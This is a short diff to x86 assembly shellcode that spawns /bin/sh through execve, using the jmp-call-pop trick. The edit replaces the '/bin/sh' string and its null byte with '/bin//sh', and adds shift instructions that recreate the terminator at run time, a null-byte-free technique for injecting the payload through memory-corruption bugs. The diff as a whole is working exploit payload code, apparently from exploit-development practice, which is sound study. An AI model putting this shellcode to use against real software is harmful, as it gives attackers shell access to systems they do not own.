@@ -97,6 +97,12 @@ exec_shell:
 
 	pop ebx;                  filename from jump call pop technique
 
+	mov dword ecx, [ebx+4];   Moves "//sh" into ecx
+	
+	shr ecx, 8;               Remove extra "/"
+
+	mov dword [ebx+4], ecx;   Moves nulled terminated /sh
+
 	xor ecx, ecx;             set argv to NULL as not needed
 
 	xor edx, edx;             set envp to NULL as not needed
@@ -108,4 +114,4 @@ exec_shell:
 
 load_bin_sh_addr:
 	call exec_shell
-	bin_sh db "/bin/sh", 0x00
+	bin_sh db "/bin//sh"
